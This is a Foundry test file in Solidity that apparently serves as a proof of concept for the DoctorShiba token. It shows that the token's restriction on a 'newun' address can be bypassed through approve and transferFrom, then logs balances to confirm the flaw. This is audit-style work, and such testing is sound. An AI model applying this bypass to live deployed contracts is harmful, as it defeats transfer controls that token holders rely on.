// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
pragma experimental ABIEncoderV2;

import "forge-std/Test.sol";
import "../src/DoctorShiba.sol";

contract DoctorShibaTest is Test {
    DoctorShiba token;
    address owner = address(0x1);
    address alice = address(0x2);
    address newun = address(0xDEAD);

    function setUp() public {
        vm.startPrank(owner);
        token = new DoctorShiba();
        token.transfernewun(newun); // Set restricted address
        vm.stopPrank();

        // Fund Alice with 100 ether (owner retains 900 ether)
        vm.prank(owner);
        token.transfer(alice, 100 ether);
    }

    function testBypassNewunRestrictionViaTransferFrom() public {
        // Record pre-attack state
        uint256 ownerBalanceBefore = token.balanceOf(owner);
        uint256 newunBalanceBefore = token.balanceOf(newun);
        console.log("--- BEFORE-Trigger Balances ---");
        console.log("Owner balance: %s", ownerBalanceBefore);
        console.log("Restricted address (newun) balance: %s", newunBalanceBefore);

        // Owner approves Alice to spend tokens on their behalf
        vm.prank(owner);
        token.approve(alice, type(uint256).max);

        uint256 amount = 1 ether;

        console.log("--- Trigger TransferFrom ---");
        // Alice bypasses restriction by transferring from owner to newun
        vm.prank(alice);
        token.transferFrom(owner, newun, amount);

        // Record post-attack state
        console.log("--- AFTER-Trigger Balances ---");
        uint256 ownerBalanceAfter = token.balanceOf(owner);
        uint256 newunBalanceAfter = token.balanceOf(newun);
        console.log("Owner balance: %s", ownerBalanceAfter);
        console.log("Restricted address (newun) balance: %s", newunBalanceAfter);

        // Calculate balance changes
        uint256 ownerDecrease = ownerBalanceBefore - ownerBalanceAfter;
        uint256 newunIncrease = newunBalanceAfter - newunBalanceBefore;

        console.log("Owner balance decreased by: %s", ownerDecrease);
        console.log("Restricted address (newun) balance increased by: %s", newunIncrease);
        console.log("Expected transfer amount: %s", amount);

        // Verify tokens were transferred to restricted address
        assertEq(token.balanceOf(newun), amount, "Tokens transferred to restricted address");

        // Differential verification
        if (ownerDecrease == amount && newunIncrease == amount) {
            console.log("Vulnerability Exists: Transfer restriction was successfully bypassed");
        } else {
            console.log("Vulnerability not Exist: Transfer restriction enforced as expected");
        }
    }
}